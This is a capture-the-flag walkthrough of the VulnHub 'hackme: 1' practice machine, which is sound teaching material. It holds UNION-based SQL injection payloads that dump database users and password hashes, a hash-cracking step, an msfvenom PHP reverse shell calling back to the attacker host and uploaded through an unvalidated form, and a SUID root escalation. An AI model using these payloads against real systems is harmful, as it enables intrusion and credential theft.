---

**Description:** Is a beginner difficulty level box, the lab was created to mimic real life environment.

**Author:** x4bx54

**Operating System:** Linux

**Aim:** To get root shell.

**Download:** [https://www.vulnhub.com/entry/hackme-1,330/](https://www.vulnhub.com/entry/hackme-1,330/)

## Information Gathering
### Host Discovery

To discover the target machine a ping scan was done, the script can be downloaded [here](https://github.com/s4rgaz/hdiscovery.git)

```bash
root@kali:~$ hdiscovery.py -r 192.168.179.0/24
192.168.179.186 => up
```

### Port Scanning

A full TCP/UDP port scan was performed with unicornscan against the target server.

```bash
root@kali:~$ us -mT -p1-65535 192.168.179.186 -r 3000 -R 3 && us -mU -p1-65535 192.168.179.186 -r 3000 -R 3
TCP open                     ssh[   22]         from 192.168.179.186  ttl 64 
TCP open                    http[   80]         from 192.168.179.186  ttl 64

UDP open                 unknown[50643]         from 192.168.179.186  ttl 64 
UDP open                 unknown[60466]         from 192.168.179.186  ttl 64
```

### Service Enumeration

In order to get more information about open ports, service detection and script scanning was done with nmap.

```bash
root@kali:~$ nmap -sV -sC -n -v -p22,80 192.168.179.186 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

### Web Enumeration

A login web page was found, but we don't have credentials.

![](/assets/images/hackme/screenshot-1.png)

When running dirb to discover web resources, was found the **/upload** directory.

```bash
root@kali:~$ dirb http://192.168.179.186 -r
...
---- Scanning URL: http://192.168.179.186/ ----
+ http://192.168.179.186/index.php (CODE:200|SIZE:100)
+ http://192.168.179.186/server-status (CODE:403|SIZE:303)
==> DIRECTORY: http://192.168.179.186/uploads/
```

We create a user account to log in to the web application.

![](/assets/images/hackme/screenshot-2.png)

We log in with the account created earlier.

A SQL Injection was discovered in the search field, as we can see when trying to inject it all the records were displayed in the browser.

```bash
' or 1=1 #
```

![](/assets/images/hackme/screenshot-4.png)


## Exploitation
### SQL Injection

Our first step of the attack is identify the column numbers, we see that there are three columns.

```bash
' or 1=1 order by 3 #
```

![](/assets/images/hackme/screenshot-5.png)

Once the number of columns has been identified, we create the following UNION statement, to see if the injected numbers are displayed in the browser.

```bash
' and 1=2 union select 1,2,3 #
```

![](/assets/images/hackme/screenshot-6.png)

As we see in the screenshot above, all the numbers injected in each column are displayed, which facilitates our exploitation process.

Retrieving mysql version.

```bash
' and 1=2 union select @@version,2,3 #
```

![](/assets/images/hackme/screenshot-7.png)

Retrieving the current database.

```bash
' and 1=2 union select database(),2,3 #
```

![](/assets/images/hackme/screenshot-8.png)

Retrieving the mysql home directory.

```bash
' and 1=2 union select @@datadir,2,3 #
```

![](/assets/images/hackme/screenshot-9.png)

Retrieving the user that the web application is using to connect to the database.

```bash
' and 1=2 union select user(),2,3 #
```

![](/assets/images/hackme/screenshot-10.png)


Retrieving users with file privileges enabled.

```bash
' and 1=2 union select user,2,3 from mysql.user where file_priv='Y' #
```

![](/assets/images/hackme/screenshot-11.png)

When trying to read the **/etc/passwd** file, it was not possible.

```bash
' and 1=2 union select load_file('/etc/passwd'),2,3 #
```

![](/assets/images/hackme/screenshot-12.png)

Retrieving the tables from the database that the web application is using.

```bash
' and 1=2 union select table_name,2,3 from information_schema.tables where table_schema=database() #
```

![](/assets/images/hackme/screenshot-13.png)

Retrieving the columns from the table **users**.

```bash
' and 1=2 union select column_name,2,3 from information_schema.columns where table_schema=database() and table_name='users' #
```

![](/assets/images/hackme/screenshot-14.png)

Retrieving the records from the table **users**.

```bash
' and 1=2 union select concat_ws(':',user,pasword),2,3 from users #
```

![](/assets/images/hackme/screenshot-15.png)

I saved the credentials into a file for easy use later.

```bash
root@kali:~$ curl -sL -b "PHPSESSID=tgq6veet5bs049gijo8pblgo3o" "http://192.168.179.186/welcome.php" --data "search='+and+1=2+union+select+concat_ws(':',user,pasword),2,3+from+users+#" | grep 'SGD' | sed 's/<td>/\n/g' | grep -Pv '^[\d\s]' | sed 's/\(.*\)<.*/\1/' | tee creds.txt 
user1:5d41402abc4b2a76b9719d911017c592
user2:6269c4f71a55b24bad0f0267d9be5508

admin:5f4dcc3b5aa765d61d8327deb882cf99
root@kali:~$
```

Then the hashes were cracked in [https://hashes.com](https://hashes.com).

![](/assets/images/hackme/screenshot-16.png)

I just played with regular expressions to align the hashes with their respective password.
 
```bash
root@kali:~$ for x in $(cat creds.txt | sed '$d'); do echo "$(echo $x | awk -F":" '{print $1}'):$(grep $(echo $x | awk -F":" '{print $NF}') cracked.txt)"; done
user1:5d41402abc4b2a76b9719d911017c592:hello

test1:05a671c66aefea124cc08b76ea6d30bb:testtest
```

When logged in as user **superadmin**, it was noted that it has a file upload feature.

![](/assets/images/hackme/screenshot-17.png)

![](/assets/images/hackme/screenshot-18.png)

We generate a php reverse shell.

```bash
root@kali:~$ msfvenom -p php/reverse_perl lhost=192.168.179.1 lport=443 -o z.php
```

We uploaded the reverse shell to the server, the upload was successful because there is not type of validation to prevent uploading arbitrary files.

![](/assets/images/hackme/screenshot-19.png)

![](/assets/images/hackme/screenshot-20.png)

We can note that the file was uploaded in the **/uploads** directory.

![](/assets/images/hackme/screenshot-21.png)

We start a netcat listener and execute the following curl command which will interpret our php reverse shell.

```bash
root@kali:~$ curl http://192.168.179.186/uploads/z.php
```

We have obtained a shell with low privileges.

```bash
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.186] 55592
script -qc /bin/bash /dev/null
www-data@hackme:/var/www/html/uploads$ 
```

Enumerating the SUID binaries an unusual file was found in the legacy home directory.

```bash
www-data@hackme:/var/www/html$ find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
...
-rwsr--r-x 1 root root 8472 Mar 26  2019 /home/legacy/touchmenot
...
```

## Privilege Escalation
### SUID Binary

When executing the **/home/legacy/touchmenot** binary this granted root access.

```bash
www-data@hackme:/var/www/html$ /home/legacy/touchmenot
/home/legacy/touchmenot
root@hackme:/var/www/html# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@hackme:/var/www/html# su -
su -
root@hackme:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@hackme:~#
```
